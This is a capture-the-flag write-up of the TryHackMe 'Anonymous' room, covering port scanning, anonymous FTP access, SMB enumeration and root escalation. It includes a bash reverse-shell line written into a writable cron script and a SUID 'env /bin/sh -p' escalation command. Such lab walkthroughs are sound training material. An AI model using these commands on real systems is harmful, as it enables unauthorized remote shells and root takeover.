---
title: Anonymous tryhackme writeup 
date: 2022-04-30 23:00:00 +0200
categories: [Blog, Writeup]
tags: [writeup, tryhackme, pentesting, pen, testing, hacking, ethical, anonymous, ftp]
comments: false

---

Today I'm going to be resolving the Anonymous room from tryhackme that is rated as Medium, but i see it more like an Easy and fast one. Take a sit and enjoy it!

# Scanning
As i always do, I start with a fast nmap scan to discover what ports are open and another scan with -sCV options to check the services and versions.
I quickly see that there are 4 ports open and they are for **ftp, ssh,** and two for **smb**
![Nmap scan for open ports](/assets/img/anon/001.png)
_First scan with Nmap_
![Nmap scan for versions](/assets/img/anon/002.png)
_Versions scan_

I can see with the versions script that the anonymous ftp login is active so i log in as **anonymous** with no password.
There's a hidden folder named scripts and there is this inside:
![Ftp contents](/assets/img/anon/003.png)
_Contents of ftp's scripts directory_
Before continuing with the files, i want to run **enum4linux** to see if there is a share in the smb service, because the room asks for the name of it.
And there it is, there are just pics inside, i could try to check with steghide but i prefer to continue with ftp files.
![smb share name](/assets/img/anon/004.png)
_Share name in smb_

# Gaining acces
s
I downloaded everything and the file **clean.sh** looks like this:
![script code](/assets/img/anon/005.png)
_clean.sh code_


It could be affected by a cronjob because **removed_files.log** has a lot of lines that says that nothing was removed by **clean.sh**
and this could mean that this is a periodical task. With this in mind i check the script's permissions and i can write, so i modify it to get a reverse shell:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<MYIP>/443 0>&1'
```

After waiting one minute i get the reverse shell as _namelessone_ 

![Access as namelessone](/assets/img/anon/006.png)
_Access gained as namelessone_

# Privilege escalation

The first thing i do is see what is inside this user's home directory and the user.txt flag is there next to the **pics** folder i saw with enum4linux.
![user flag found](/assets/img/anon/007.png)
_user.txt flag found_

Before trying to do anything with the pics i checked what SUID files are in the server and **env** was one of them. Running this line I gained access as root:

```bash
env /bin/sh -p
```

![root access](/assets/img/anon/008.png)
_Access gained as root!_

The last flag is in root directory as usually does:

![root flag found](/assets/img/anon/009.png)
_root.txt flag found_


This was an easy one for me, but at least it was funny.Thank you for reading me and have a good day!
